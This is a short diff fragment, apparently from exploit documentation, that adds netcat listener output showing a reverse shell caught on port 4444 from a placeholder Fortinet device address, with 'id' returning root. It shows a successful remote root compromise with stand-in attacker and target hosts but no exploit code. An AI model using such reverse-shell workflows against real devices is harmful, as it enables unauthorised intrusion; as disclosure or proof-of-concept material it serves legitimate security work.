@@ -1,0 +1,4 @@
+listening on [any] 4444 ...
+        connect to [YOUR_ATTACKER_IP] from (UNKNOWN) [FORTINET_IP] 12345
+        $ id
+        uid=0(root) gid=0(root) groups=0(root)
